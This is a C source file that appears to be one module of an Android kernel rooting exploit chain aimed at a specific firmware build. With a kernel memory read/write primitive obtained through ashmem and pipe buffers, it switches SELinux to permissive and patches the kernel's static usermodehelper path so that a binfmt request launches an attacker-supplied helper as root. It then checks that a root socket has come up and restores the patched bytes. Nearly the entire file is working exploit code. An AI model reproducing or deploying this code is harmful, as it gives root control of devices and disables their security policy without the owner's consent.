/*
 * Starts the root helper through the kernel's native synchronous
 * exec_binprm -> request_module -> call_usermodehelper path.
 *
 * ZZI8 was built with CONFIG_STATIC_USERMODEHELPER_PATH="". The empty path
 * lives at a firmware-derived, KASLR-relative address. After pipe R/W is
 * proven, this module temporarily replaces the empty bytes with a short,
 * preflighted, byte-verified helper copy, triggers one invalid binfmt request, and
 * restores the exact original bytes as soon as the synchronous request
 * returns. No task walk, fdtable walk, PTY object, vmemmap guess, or manual
 * workqueue list mutation is used.
 */
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include "08_ashmem_configfs_rw.h"
#include "09_pipe_buffer_rw.h"
#include "10_umh_binfmt_plan.h"
#include "10_workqueue_umh_root.h"
#include "90_diagnostic_checkpoint.h"
#include "target.h"

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"

static int is_direct_ptr(uint64_t value) {
  return value >= TARGET_LINEAR_MAP_BASE && value < TARGET_LINEAR_MAP_END;
}

static int kernel_image_linear_alias(uint64_t target_addr,
                                     uint64_t memstart_addr,
                                     uint64_t kimage_voffset,
                                     uint64_t *linear_alias) {
  if (!linear_alias || (memstart_addr & TARGET_PAGE_MASK) != 0 ||
      (kimage_voffset & TARGET_PAGE_MASK) != 0 ||
      target_addr < kimage_voffset) {
    return 0;
  }
  uint64_t physical = target_addr - kimage_voffset;
  if (physical < memstart_addr) {
    return 0;
  }
  uint64_t linear_offset = physical - memstart_addr;
  if (linear_offset >= TARGET_LINEAR_MAP_END - TARGET_LINEAR_MAP_BASE) {
    return 0;
  }
  *linear_alias = TARGET_LINEAR_MAP_BASE + linear_offset;
  return is_direct_ptr(*linear_alias);
}

static int write_full(int fd, const void *buffer, size_t length) {
  const uint8_t *cursor = buffer;
  while (length != 0) {
    ssize_t count = write(fd, cursor, length);
    if (count < 0 && errno == EINTR) continue;
    if (count <= 0) return 0;
    cursor += count;
    length -= (size_t)count;
  }
  return 1;
}

static int read_exact_file(const char *path, void *buffer, size_t length) {
  int fd = open(path, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
  if (fd < 0) return 0;
  uint8_t *cursor = buffer;
  size_t remaining = length;
  while (remaining != 0) {
    ssize_t count = read(fd, cursor, remaining);
    if (count < 0 && errno == EINTR) continue;
    if (count <= 0) {
      close(fd);
      return 0;
    }
    cursor += count;
    remaining -= (size_t)count;
  }
  uint8_t extra = 0;
  ssize_t tail;
  do {
    tail = read(fd, &extra, sizeof(extra));
  } while (tail < 0 && errno == EINTR);
  int closed = close(fd) == 0;
  return tail == 0 && closed;
}

static int fsync_tmp_dir(void) {
  int fd = open("/data/local/tmp", O_RDONLY | O_DIRECTORY | O_CLOEXEC);
  if (fd < 0) return 0;
  int ok = fsync(fd) == 0;
  close(fd);
  return ok;
}

static int regular_files_equal(const char *left_path, const char *right_path) {
  int left = -1;
  int right = -1;
  int equal = 0;
  struct stat left_stat;
  struct stat right_stat;
  uint8_t left_buffer[4096];
  uint8_t right_buffer[4096];

  left = open(left_path, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
  right = open(right_path, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
  if (left < 0 || right < 0 || fstat(left, &left_stat) != 0 ||
      fstat(right, &right_stat) != 0 || !S_ISREG(left_stat.st_mode) ||
      !S_ISREG(right_stat.st_mode) || left_stat.st_size <= 0 ||
      left_stat.st_size != right_stat.st_size) {
    goto out;
  }
  for (;;) {
    ssize_t left_count;
    ssize_t right_count;
    do {
      left_count = read(left, left_buffer, sizeof(left_buffer));
    } while (left_count < 0 && errno == EINTR);
    do {
      right_count = read(right, right_buffer, sizeof(right_buffer));
    } while (right_count < 0 && errno == EINTR);
    if (left_count < 0 || right_count < 0 || left_count != right_count ||
        (left_count > 0 &&
         memcmp(left_buffer, right_buffer, (size_t)left_count) != 0)) {
      goto out;
    }
    if (left_count == 0) {
      equal = 1;
      break;
    }
  }

out:
  if (left >= 0) close(left);
  if (right >= 0) close(right);
  return equal;
}

static int ensure_short_helper(const char *source) {
  struct stat source_stat;
  struct stat short_stat;
  if (!source || stat(source, &source_stat) != 0 ||
      !S_ISREG(source_stat.st_mode) || access(source, X_OK) != 0) {
    return 0;
  }
  if (lstat(TARGET_STATIC_UMH_PATH, &short_stat) == 0 &&
      S_ISREG(short_stat.st_mode) &&
      regular_files_equal(source, TARGET_STATIC_UMH_PATH) &&
      access(TARGET_STATIC_UMH_PATH, X_OK) == 0) {
    return 1;
  }

  char temporary[96];
  int source_fd = -1;
  int temporary_fd = -1;
  int copied = 0;
  int count = snprintf(temporary, sizeof(temporary),
                       "/data/local/tmp/.rmg-umh-%d", (int)getpid());
  if (count <= 0 || (size_t)count >= sizeof(temporary)) return 0;
  unlink(temporary);
  source_fd = open(source, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
  temporary_fd = open(temporary,
                      O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC | O_NOFOLLOW,
                      0700);
  if (source_fd < 0 || temporary_fd < 0 ||
      fstat(source_fd, &source_stat) != 0 ||
      !S_ISREG(source_stat.st_mode)) {
    goto out;
  }
  for (;;) {
    uint8_t buffer[4096];
    ssize_t read_count;
    do {
      read_count = read(source_fd, buffer, sizeof(buffer));
    } while (read_count < 0 && errno == EINTR);
    if (read_count < 0) goto out;
    if (read_count == 0) break;
    if (!write_full(temporary_fd, buffer, (size_t)read_count)) goto out;
  }
  if (fchmod(temporary_fd, 0700) != 0 || fsync(temporary_fd) != 0 ||
      close(temporary_fd) != 0) {
    temporary_fd = -1;
    goto out;
  }
  temporary_fd = -1;
  if (rename(temporary, TARGET_STATIC_UMH_PATH) != 0 || !fsync_tmp_dir() ||
      stat(TARGET_STATIC_UMH_PATH, &short_stat) != 0 ||
      !S_ISREG(short_stat.st_mode) ||
      access(TARGET_STATIC_UMH_PATH, X_OK) != 0 ||
      !regular_files_equal(source, TARGET_STATIC_UMH_PATH)) {
    goto out;
  }
  copied = 1;

out:
  {
    int saved_errno = errno;
    if (source_fd >= 0) close(source_fd);
    if (temporary_fd >= 0) close(temporary_fd);
    unlink(temporary);
    errno = saved_errno;
  }
  return copied;
}

static int stage_binfmt_trigger(const struct oss_umh_binfmt_plan *plan) {
  char temporary[96];
  int count = snprintf(temporary, sizeof(temporary),
                       "/data/local/tmp/.rmg-binfmt-%d", (int)getpid());
  if (!plan || count <= 0 || (size_t)count >= sizeof(temporary)) return 0;
  unlink(temporary);
  int fd = open(temporary,
                O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC | O_NOFOLLOW, 0700);
  if (fd < 0) return 0;
  int wrote = write_full(fd, plan->trigger, sizeof(plan->trigger));
  int mode_ok = wrote && fchmod(fd, 0700) == 0;
  int sync_ok = mode_ok && fsync(fd) == 0;
  int close_ok = close(fd) == 0;
  if (!sync_ok || !close_ok ||
      rename(temporary, TARGET_BINFMT_TRIGGER_PATH) != 0 ||
      !fsync_tmp_dir()) {
    int saved_errno = errno;
    unlink(temporary);
    errno = saved_errno;
    return 0;
  }
  uint8_t readback[OSS_BINFMT_TRIGGER_SIZE];
  return read_exact_file(TARGET_BINFMT_TRIGGER_PATH, readback,
                         sizeof(readback)) &&
         memcmp(readback, plan->trigger, sizeof(readback)) == 0 &&
         access(TARGET_BINFMT_TRIGGER_PATH, X_OK) == 0;
}

static int execute_trigger_expect_enoexec(void) {
  pid_t child = fork();
  if (child < 0) return 0;
  if (child == 0) {
    char *const argv[] = {(char *)TARGET_BINFMT_TRIGGER_PATH, NULL};
    char *const envp[] = {NULL};
    execve(TARGET_BINFMT_TRIGGER_PATH, argv, envp);
    _exit(errno == ENOEXEC ? 0 : 1);
  }
  int status = 0;
  pid_t waited;
  do {
    waited = waitpid(child, &status, 0);
  } while (waited < 0 && errno == EINTR);
  return waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static int prove_binfmt_request(const struct oss_umh_binfmt_plan *plan) {
  /* The shell SELinux domain cannot access the per-event tracefs controls on
   * ZZI8. Exact uname/property matching plus the host ELF verifier pins the
   * exec_binprm -> request_module contract. Runtime preflight therefore
   * validates the exact four-byte trigger and its ENOEXEC completion without
   * changing global trace configuration. */
  return plan && execute_trigger_expect_enoexec();
}

int root_umh_preflight(const char *root_umh_path) {
  struct oss_umh_binfmt_plan plan;
  uint32_t uid = (uint32_t)getuid();
  if (!oss_umh_binfmt_plan_build(uid, &plan)) {
    fprintf(stderr, "[root_umh] preflight rejected uid=%u\n", uid);
    return 0;
  }
  if (!ensure_short_helper(root_umh_path)) {
    fprintf(stderr,
            "[root_umh] preflight short helper failed source=%s target=%s "
            "errno=%d\n",
            root_umh_path ? root_umh_path : "(null)",
            TARGET_STATIC_UMH_PATH, errno);
    return 0;
  }
  if (!stage_binfmt_trigger(&plan)) {
    fprintf(stderr, "[root_umh] preflight trigger staging failed errno=%d\n",
            errno);
    return 0;
  }
  if (!prove_binfmt_request(&plan)) {
    fprintf(stderr,
            "[root_umh] preflight binfmt contract proof failed name=%s "
            "errno=%d\n",
            plan.module_name, errno);
    return 0;
  }
  fprintf(stderr,
          "[root_umh] preflight ready helper=%s trigger=%s request=%s "
          "proof=execve-enoexec+exact-elf-contract\n",
          TARGET_STATIC_UMH_PATH, TARGET_BINFMT_TRIGGER_PATH,
          plan.module_name);
  oss_diag_checkpoint("root-umh-binfmt-preflight-ready");
  return 1;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) return 0;
  struct sockaddr_un address;
  memset(&address, 0, sizeof(address));
  address.sun_family = AF_UNIX;
  snprintf(address.sun_path, sizeof(address.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&address, sizeof(address)) == 0;
  close(fd);
  return ready;
}

static uint64_t monotonic_ms(void) {
  struct timespec now;
  if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return 0;
  return (uint64_t)now.tv_sec * 1000ULL +
         (uint64_t)now.tv_nsec / 1000000ULL;
}

static int trigger_binfmt_bounded(int *completed) {
  *completed = -1;
  pid_t child = fork();
  if (child < 0) return 0;
  *completed = 0;
  if (child == 0) {
    char *const argv[] = {(char *)TARGET_BINFMT_TRIGGER_PATH, NULL};
    char *const envp[] = {NULL};
    execve(TARGET_BINFMT_TRIGGER_PATH, argv, envp);
    _exit(errno == ENOEXEC ? 0 : 1);
  }
  uint64_t deadline = monotonic_ms() + TARGET_UMH_TRIGGER_TIMEOUT_MS;
  for (;;) {
    int status = 0;
    pid_t waited = waitpid(child, &status, WNOHANG);
    if (waited == child) {
      *completed = 1;
      return WIFEXITED(status) && WEXITSTATUS(status) == 0;
    }
    if (waited < 0 && errno != EINTR) return 0;
    uint64_t now = monotonic_ms();
    if (!now || now >= deadline) return 0;
    usleep(1000);
  }
}

int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
                                uint64_t memstart_addr,
                                uint64_t kimage_voffset,
                                const char *root_umh_path,
                                int32_t *kernel_state,
                                int32_t irreversible_state) {
  struct oss_umh_binfmt_plan plan;
  uint8_t original_guard[TARGET_STATIC_UMH_GUARD_SIZE];
  uint8_t readback_guard[TARGET_STATIC_UMH_GUARD_SIZE];
  uint8_t replacement_readback[TARGET_STATIC_UMH_PATCH_SIZE];
  uint8_t original_selinux = 1;
  int selinux_changed = 0;
  int path_may_be_changed = 0;
  int trigger_completed = -1;
  int path_restored = 0;
  int result = 0;

  if (!oss_umh_binfmt_plan_build((uint32_t)getuid(), &plan) ||
      !ensure_short_helper(root_umh_path) || !stage_binfmt_trigger(&plan)) {
    fprintf(stderr, "[root_umh] deterministic inputs no longer valid\n");
    return 0;
  }

  uint64_t static_path_addr = kernel_base + TARGET_STATIC_UMH_PATH_OFF;
  uint64_t static_path_alias = 0;
  uint64_t selinux_addr =
      kernel_base + TARGET_SELINUX_STATE_ENFORCING_OFF;
  uint64_t selinux_alias = 0;
  if (!kernel_image_linear_alias(static_path_addr, memstart_addr,
                                 kimage_voffset, &static_path_alias) ||
      !kernel_image_linear_alias(selinux_addr, memstart_addr,
                                 kimage_voffset, &selinux_alias)) {
    fprintf(stderr, "[root_umh] static alias derivation failed\n");
    return 0;
  }
  if (!oss_pipe_rw_read(fd, static_path_alias, original_guard,
                        sizeof(original_guard)) ||
      !oss_umh_static_guard_valid(original_guard, sizeof(original_guard))) {
    fprintf(stderr,
            "[root_umh] firmware static helper guard mismatch addr=%016llx "
            "alias=%016llx\n",
            (unsigned long long)static_path_addr,
            (unsigned long long)static_path_alias);
    return 0;
  }
  if (!oss_pipe_rw_read(fd, selinux_alias, &original_selinux,
                        sizeof(original_selinux)) ||
      original_selinux > 1) {
    fprintf(stderr, "[root_umh] SELinux state read rejected value=%u\n",
            original_selinux);
    return 0;
  }

  unlink(ROOT_SOCKET_PATH);
  if (kernel_state) {
    __atomic_store_n(kernel_state, irreversible_state, __ATOMIC_RELEASE);
  }
  uint8_t permissive = 0;
  uint8_t selinux_readback = 0xff;
  selinux_changed = original_selinux != permissive;
  if (!oss_pipe_rw_write(fd, selinux_alias, &permissive,
                         sizeof(permissive)) ||
      !oss_pipe_rw_read(fd, selinux_alias, &selinux_readback,
                        sizeof(selinux_readback)) ||
      selinux_readback != permissive) {
    fprintf(stderr, "[root_umh] SELinux permissive publish failed got=%u\n",
            selinux_readback);
    goto out;
  }

  path_may_be_changed = 1;
  if (!oss_pipe_rw_write(fd, static_path_alias, plan.replacement,
                         sizeof(plan.replacement)) ||
      !oss_pipe_rw_read(fd, static_path_alias, replacement_readback,
                        sizeof(replacement_readback)) ||
      memcmp(replacement_readback, plan.replacement,
             sizeof(replacement_readback)) != 0) {
    fprintf(stderr, "[root_umh] static helper publish/readback failed\n");
    goto out;
  }

  oss_diag_checkpoint("umh-binfmt-pretrigger");
  int trigger_ok = trigger_binfmt_bounded(&trigger_completed);
  if (trigger_completed == 0) {
    fprintf(stderr,
            "[root_umh] binfmt trigger timed out; static path remains pinned "
            "for reboot\n");
    goto out;
  }

  path_restored =
      oss_pipe_rw_write(fd, static_path_alias, original_guard,
                        TARGET_STATIC_UMH_PATCH_SIZE) &&
      oss_pipe_rw_read(fd, static_path_alias, readback_guard,
                       sizeof(readback_guard)) &&
      memcmp(readback_guard, original_guard, sizeof(readback_guard)) == 0;
  if (path_restored) path_may_be_changed = 0;
  if (!trigger_ok || !path_restored) {
    fprintf(stderr,
            "[root_umh] binfmt result trigger=%d restore=%d request=%s\n",
            trigger_ok, path_restored, plan.module_name);
    goto out;
  }

  int socket_ok = 0;
  for (unsigned int i = 0; i < TARGET_UMH_SOCKET_POLL_COUNT; i++) {
    if (root_socket_ready()) {
      socket_ok = 1;
      break;
    }
    usleep(TARGET_UMH_SOCKET_POLL_USEC);
  }
  fprintf(stderr,
          "[root_umh] binfmt result request=%s trigger=%d socket=%d "
          "restore=%d static=%016llx\n",
          plan.module_name, trigger_ok, socket_ok, path_restored,
          (unsigned long long)static_path_addr);
  result = socket_ok && path_restored;

out:
  if (path_may_be_changed && trigger_completed != 0) {
    path_restored =
        oss_pipe_rw_write(fd, static_path_alias, original_guard,
                          TARGET_STATIC_UMH_PATCH_SIZE) &&
        oss_pipe_rw_read(fd, static_path_alias, readback_guard,
                         sizeof(readback_guard)) &&
        memcmp(readback_guard, original_guard, sizeof(readback_guard)) == 0;
    if (path_restored) path_may_be_changed = 0;
  }
  if (!result && selinux_changed) {
    uint8_t restored_value = 0xff;
    int restored = oss_pipe_rw_write(fd, selinux_alias, &original_selinux,
                                     sizeof(original_selinux)) &&
                   oss_pipe_rw_read(fd, selinux_alias, &restored_value,
                                    sizeof(restored_value)) &&
                   restored_value == original_selinux;
    fprintf(stderr, "[root_umh] SELinux restore=%d value=%u\n", restored,
            restored_value);
  }
  if (path_may_be_changed) {
    fprintf(stderr,
            "[root_umh] unsafe static helper state preserved; reboot required\n");
  }
  oss_diag_checkpoint(result ? "umh-root-socket-ok"
                             : "umh-root-socket-miss");
  return result;
}

int root_umh_install_fd(int fd, uint64_t kernel_base,
                        uint64_t memstart_addr, uint64_t kimage_voffset,
                        const char *root_umh_path) {
  return root_umh_install_fd_tracked(
      fd, kernel_base, memstart_addr, kimage_voffset, root_umh_path, NULL, 0);
}

int root_umh_install(uint64_t kernel_base, uint64_t page_base,
                     const char *root_umh_path) {
  int fd = oss_open_kernel_rw();
  if (fd < 0) {
    fprintf(stderr, "[root_umh] open resolved ashmem node failed\n");
    return 0;
  }
  uint64_t ashmem_misc_fops_addr =
      kernel_base + TARGET_ASHMEM_MISC_FOPS_OFF;
  int verified =
      oss_verify_kernel_access(fd, ashmem_misc_fops_addr, page_base);
  uint64_t memstart_addr = 0;
  uint64_t kimage_voffset = 0;
  int alias_inputs =
      verified &&
      oss_kernel_read(fd, kernel_base + TARGET_MEMSTART_ADDR_OFF,
                      &memstart_addr, sizeof(memstart_addr)) &&
      oss_kernel_read(fd, kernel_base + TARGET_KIMAGE_VOFFSET_OFF,
                      &kimage_voffset, sizeof(kimage_voffset));
  int pipe_ready =
      alias_inputs && oss_pipe_rw_install(fd, kernel_base, page_base);
  int rooted = pipe_ready &&
               root_umh_install_fd(fd, kernel_base, memstart_addr,
                                   kimage_voffset, root_umh_path);
  close(fd);
  return rooted;
}
